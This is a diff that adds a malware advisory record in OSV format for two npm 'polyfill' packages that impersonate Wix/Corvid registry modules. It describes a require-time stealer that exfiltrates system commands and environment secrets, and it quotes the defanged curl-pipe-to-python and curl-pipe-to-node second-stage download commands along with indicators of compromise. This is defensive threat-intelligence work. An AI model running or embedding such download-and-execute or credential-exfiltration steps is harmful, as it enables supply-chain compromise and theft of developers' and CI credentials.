@@ -1,0 +1,72 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12580",
+  "aliases": [
+    "MAL-2026-17577"
+  ],
+  "modified": "2026-10-05T12:28:11Z",
+  "published": "2026-10-05T11:49:15Z",
+  "summary": "Malicious code in css-vvgsze-polyfill (npm)",
+  "details": "css-gwqyid-polyfill@1.0.0 and css-vvgsze-polyfill@1.0.0 ship a require-time credential stealer in thunderboltRegistry.js that runs the moment the module is imported. The file first deletes its own entry from require.cache to hide from later inspection, then uses child_process.execSync to run `id`, `id -un`/`whoami`, `env`, and `ifconfig`/`ip addr`, exfiltrating each result over HTTPS GET to hxxps://unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com/ as query parameters (cmd=id, cmd=whoami, cmd=env, cmd=ifconfig, cmd=reverse-shell), plus a beacon=rce-poc call carrying node version, platform and pid, and a site=\u003chostname\u003e tag. The `env` exfiltration transmits the installer's entire environment, including NPM_TOKEN, GITHUB_TOKEN/GH_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, OPENAI_API_KEY, ANTHROPIC_API_KEY, STRIPE_SECRET_KEY, SLACK_TOKEN, GITLAB_TOKEN, DOCKER_PASSWORD, SENDGRID_API_KEY, TWILIO_AUTH_TOKEN, HF_TOKEN, PYPI_TOKEN, VERCEL_TOKEN, NETLIFY_AUTH_TOKEN, CLOUDFLARE_API_TOKEN, DIGITALOCEAN_TOKEN and CI_REGISTRY_PASSWORD. It then attempts a second-stage download-and-execute: `curl -L hxxps://appsecc[.]com/py | python3` in css-gwqyid-polyfill and `curl -L hxxps://appsecc[.]com/js | node` in css-vvgsze-polyfill. The package's index.js is an empty stub (module.exports = {}) and registry-manifest.min.json maps nine Parastorage/Corvid registry module names (thunderboltRegistry, siteAssetsRegistry, documentManagementRegistry, editorRegistry, autoCompleteRegistry, thunderboltBuilderRegistry, thunderboltPreviewRegistry, and others) to the same payload file, so the package masquerades as a CSS polyfill while impersonating Wix/Corvid registry internals to harvest CI and cloud credentials.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "css-vvgsze-polyfill",
+        "purl": "pkg:npm/css-vvgsze-polyfill"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/css-vvgsze-polyfill/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12580"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-05T11:49:15Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "appsecc[.]com",
+          "static[.]parastorage[.]com",
+          "unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com"
+        ],
+        "sha256": [
+          "16643b07959701a9e6c2ab2ca976056d40aea61635a0d32cdb79ea9b0da1ef2f"
+        ],
+        "url_observed": [
+          "hxxps://appsecc[.]com/js",
+          "hxxps://appsecc[.]com/py",
+          "hxxps://static[.]parastorage[.]com/unpkg/css-gwqyid-polyfill@1[.]0[.]0/thunderboltRegistry[.]js",
+          "hxxps://unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com/"
+        ]
+      }
+    }
+  }
+}
